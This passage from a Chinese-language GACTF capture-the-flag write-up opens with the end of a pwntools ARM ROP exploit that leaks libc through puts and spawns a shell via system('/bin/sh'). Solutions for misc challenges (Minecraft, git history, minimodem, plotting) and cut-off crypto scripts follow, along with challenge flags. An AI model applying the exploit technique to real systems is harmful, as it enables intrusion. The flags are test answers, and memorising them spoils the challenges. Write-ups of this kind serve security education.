    p.sendline("2")
    p.send("a"*16)
    p.recvuntil("4:logout\n")
    p.sendline("4")
    p.recvuntil("3: exit\n")
    p.send("2\n")
    p.recvuntil("username:")
    p.sendline("root")
    p.recvuntil("password:")
    p.send("a"*32)
    p.recvuntil("You can input token:\n")
    p.sendline("a")
    p.recvuntil("4:Logout\n") 
    p.sendline("3")
    mov_r3_r0 = 0x1086d
    pop_r3_pc = 0x00010550
    p.send("a"*0x20 + p32(0x0) + p32(pop_r3_pc) + p32(elf.got['puts']) + p32(mov_r3_r0) + p32(0x0) + p32(0x00010b21))
    libcbase = u32(p.recv(4)) - libc.symbols['puts']
    log.info("libcbase: %#x" %libcbase)
    system_addr = libc.symbols["system"] + libcbase
    binsh_str = libcbase + 0x000D5F2C
    log.info("system: %#x bin_sh: %#x" %(system_addr, binsh_str))
    p.recvuntil("You can input token:\n")
    p.sendline("a")
    pop_r0_pc = 0x0004c631 + libcbase
    p.recvuntil("4:Logout\n") 
    p.sendline("3")
    p.send("a"*0x20 + p32(0x0) + p32(pop_r0_pc) + p32(binsh_str) + p32(system_addr))
    p.interactive()
###  Minecraft Redstone Music
HMCL打开
/time set 1000 调白天  
/gamemode 1 创造模式
2分多钟第一段音乐开始时的字幕得
`_Mus1c_in_`
hint提示查看日志，根据日志关掉部分冲突mod
进入后，替代命令方块草方块下其中不发光的玻璃
`Min3cr4fT}`
第一部分古古怪怪，因为下载不了所以去看json
然后发现
这神奇的版本号，然后提取数字转ascii得到GACTF{Th3
完整flag：`GACTF{Th3_Mus1c_in_Min3cr4fT}`
###  trihistory
首先把镜像保存下来
`docker save -o 123.tar impakho/trihistory:latest`
一个文件夹中发现存在.git泄露
`\f1311a709f1ffdfdd4deb2bc2fccd14fd2d2df9ca9bd1cb09a6a268fe2c9b720\layer\root\history\.git`
放到服务器上再装个git，怀疑flag在历史版本中，git的具体操作课参考  
[https://blog.csdn.net/songyuequan/article/details/82933745?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf](https://blog.csdn.net/songyuequan/article/details/82933745?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf)
查看历史版本
`cat .git/logs/refs/heads/master`
不断用git cat-file -p 往前找，发现存在.flag.html.swp
`git cat-file -p 4fb07e24c331cedbc5ff34a7addbf8db8db2e5f5`
`GACTF{23b72be2-e4db-4093-9c26-d564318b97d9}`
###  oldmodem
安装一个minimodem
由bell202
    ./minimodem --rx -f encoded.wav 1200
##
flag为`GACTF{9621827f-a41b-4f27-8d72-9e0b77415a4f}`
###  capture
提取数据的脚本：
    import re
    with open("captured.txt") as f:
        data = f.read()
    ans = re.findall(":.*[DU,](.*?),(.*?)\n",data)
    print ans[0]
    with open("data","w") as f:
        f.write(str(ans))
画图脚本
    # -*- coding: utf-8 -*-    from PIL import Image
    # 知道数据点阵然后画图
    tempimage = Image.new('RGB', (600, 12000), '#000000')
    with open("123.txt") as f:
        try:
            while True:
                s=f.readline()
                x=int(s.split(",")[0])
                y=int(s.split(",")[1])
                tempimage.putpixel((x,y),(255,255,255))
        except:
            pass
    tempimage.show()
    tempimage.save("./465.png")
画出来点很稀疏，仔细看还是能认出来的
## Crypto
###  da Vinci after rsa
这一题e与phi不互素，这里我先用的amm域下开根，然后CRT，找到明文最短的，就是flag的乱序，最后根据斐波那契数列打乱的规则来恢复flag的顺序
    # -*- coding: cp936 -*-    from Crypto.Util.number import *
    from gmpy2 import *
    #域下开根
    m1=[mpz(2816114411493328258682873357893989007684496552202823306045771363205185148674391), mpz(180966415225632465120208272366108475667934082405238808958048294287011243645), mpz(1369135259891793292334345751773139388112378132927363770631732500241630990458667), mpz(5570877862584063114417410584640901580756179707042774516590562822938385811269597), mpz(8499052407588078002885931765166137308397074232361087682974448633946350539292222)]
    n1=9127680453986244150392840833873266696712898279308227257525736684312919750469261
    m2=[mpz(6139772527803903), mpz(9898464751509789), mpz(8415400986072042), mpz(2722510300825886), mpz(6537111956662153)]
    n2=11237753507624591
    m3=7361
    for i in range(5):
        for j in range(5):
            m = CRT([n1,n2],[m1[i],m2[j]])
            #print m.bit_lengt()
            if m.bit_length() 
    from Crypto.Util.number import long_to_bytes
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    import random
    from hashlib import sha256
    #from secret import flag, 
    from gmpy2 import gcd
    def add_points(P, Q):
        return ((P[0]*Q[0]-P[1]*Q[1]) % p, (P[0]*Q[1]+P[1]*Q[0]) % p)
    def multiply(P, n):
        Q = (1, 0)
        while n > 0:
            if n % 2 == 1:
                Q = add_points(Q, P)
            P = add_points(P, P)
            n = n//2
        return Q
    def gen_key():
        sk = random.randint(0, 2**256)
        pk = multiply(g, sk)
        return sk, pk
    g = (29223879291878505213325643878338189297997503744039619988987863719655098,32188620669315455017576071518169599806490004123869726364682284676721556)
    A=(68279847973010227567437241690876400434176575735647388141445319082120661, 36521392659318312718307506287199839545959127964141955928297920414981390)
    B=(84698630137710906531637499064120297563999383201108850561060383338482806, 10975400339031190591877824767290004140780471215800442883565278903964109)
    #p = gcd(A[0]^2 + A[1]^2 - 1, B[0]^2 + B[1]^2 - 1)//4
    p=108848362000185157098908557633810357240367513945191048364780883709439999
    '''
    #sage
    F = GF(p)
    R. = PolynomialRing(F)
    K. = F.extension(w^2 + 1)
    g_K = g[0] + g[1]*w
    B_K = B[0] + B[1]*w
    b = discrete_log(B_K, g_K)
    print(b)
    print(multiply(g, b) == B)
    '''
    b=42167952593276919058888649873311585235839247920808784925745017581061391
    enc = bytes.fromhex('26b1b05962d188f1f2abdfad2cef049d45cfc27d9e46f40ebe52e367941bcfa05dd0ef698f528375be2185759e663431')
    print(enc)
    shared = multiply(A, b)[0]
    key = sha256(long_to_bytes(shared)).digest()
    print(key)
    aes = AES.new(key, AES.MODE_ECB)